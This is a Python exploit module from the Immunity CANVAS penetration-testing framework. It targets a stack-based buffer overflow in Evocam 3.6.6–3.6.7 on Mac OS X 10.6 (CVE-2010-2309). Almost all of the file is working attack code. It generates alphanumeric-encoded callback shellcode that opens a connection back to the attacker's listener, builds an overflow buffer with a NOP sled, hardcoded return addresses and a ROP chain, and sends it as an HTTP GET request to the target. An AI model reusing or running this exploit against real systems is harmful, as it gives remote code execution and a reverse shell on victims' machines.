#! /usr/bin/env python

"""
Evocam 3.6.6 to 3.6.7 Stack based buffer overflow
"""

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2012
#http://www.immunityinc.com/CANVAS/ for more information


#Part of CANVAS For licensing information, please refer to your
#Immunity CANVAS licensing documentation

import sys
if "." not in sys.path:
    sys.path.append(".")

import time
import httplib
import canvasengine
from exploitutils import *
from tcpexploit import tcpexploit

NAME                           = "EVOCAM"
DESCRIPTION                    = "OSX Stack based buffer overflow"
DOCUMENTATION                  = {}
DOCUMENTATION['VENDOR']        = "Evologic"
DOCUMENTATION["Repeatability"] = "One shot"
DOCUMENTATION["CVE Name"]      = "CVE-2010-2309"
DOCUMENTATION["CVE Url"]       = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-2309"
DOCUMENTATION['CVSS']          = 7.5

VERSION                        = "1.0"

PROPERTY                       = {}
PROPERTY['TYPE']               = "Exploit"
PROPERTY['SITE']               = "Remote"
PROPERTY['ARCH']               = [["Mac OS X"]]
PROPERTY['VERSION']            = ["10.6"]

CHANGELOG                      = """
"""

NOTES                          = """
Only tested in OS X 10.6 (snow leopard)
"""


class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        self.setPort(8080)
        self.setHost("")
        self.setVersion(1)
        self.badstring=["\x00", "\x0c"] # Doesn't matter because we are using an alphanumeric shellcode, but just for in case.
        self.name=NAME

    def getargs(self):
        self.port = self.argsDict.get("port", self.port)

    def neededListenerTypes(self):
        return [canvasengine.UNIVERSAL_MOSDEF]

    def createShellcode(self):
        host = self.callback.ip
        port = self.callback.port

        from shellcode.standalone.osx.payloads import payloads
        from encoder import alphanumeric

        self.log("OSX X86 Shellcode %d" % self.version)

        p = payloads(self)
        self.shellcode = p.assemble(p.callback(host, port, universal=True,
                                               fork_exit=False))

        encoder = alphanumeric.AlphaNum()
        get_pc = encoder.get_pc(reg='eax')
        self.shellcode = get_pc + encoder.encode(self.shellcode)
        self.log("Shellcode size: %d" % len(self.shellcode))
        self.log(prettyhexprint(self.shellcode))

    def run(self):
        """
        Actually exploit the target.
        """
        self.getargs()
        self.host = self.target.interface

        buffer = '\x90' * 600

        # Needs 1556 before put the the READABLE ADDRESS(1)
        # Shellcode size = 663

        buffer += self.shellcode
        buffer += '\x90' * (1556 - (600 + len(self.shellcode)))
        buffer += "\xE2\x6C\xE5\x8F" # READABLE ADDRESS(1)
        buffer += '\x90' * 4
        buffer += '\xED\xA3\xE2\x8F' # EIP ADD ESP,0x8
        buffer += "\xE2\x6C\xE5\x8F" # READABLE ADDRESS
        buffer += '\x90' * 4

        # Saving EBX, ESI and EDI
        rop = "\x95\xd3\xE2\x8F" # pop ebx ; pop edi ; pop esi
        rop += "\x90" * 4 # JUNK
        rop += "\x10\xdb\xE2\x8F" # strcpy addr
        rop += "\x5a\xb6\xE2\x8F" # push ebp

        # Saving EBP
        rop += "\x99\xe7\xE0\x8F" # pop ebp ; al,29h
        rop += "\xE2\x6C\xE5\x8F" # READABLE ADDRESS

        rop += "\x34\xfb\xE2\x8F" # pusha ; sbb al, 58h

        buffer += rop

        """
        mov eax, esp
        add eax, -3D4
        sub ebp, -20
        push eax
        push ebp
        call edi
        jmp eax
        """

        aux_shellcode = "\x8B\xC4\x05\x2C\xFC\xFF\xFF\x83\xED\xE0\x50\x55\xFF\xD7\xFF\xE0"

        buffer += aux_shellcode
        buffer += '\x90' * (400 - (len(rop + aux_shellcode)))

        conn = httplib.HTTPConnection(self.host,self.port)
        conn.request("GET", buffer)

        for _ in xrange(0, 10):
            if self.ISucceeded(): return 1
            time.sleep(1)

        return 0



if __name__ == '__main__':
    print "Running CANVAS "+NAME+" version "+VERSION
    app = theexploit()
    ret = standard_callback_commandline(app)

